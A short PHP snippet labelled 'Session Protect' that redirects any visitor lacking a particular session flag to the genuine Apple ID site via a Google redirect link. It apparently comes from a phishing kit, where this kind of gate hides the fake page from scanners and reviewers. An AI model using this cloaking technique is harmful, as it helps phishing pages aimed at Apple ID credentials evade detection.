<?php

# Session Protect Snippet

session_start();
if(!isset($_SESSION['page_a_visited'])){
        header("Location: https://www.google.ca/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwi_yey8kvzJAhWwj4MKHVp5ALcQFggcMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww");
		die();

}
?>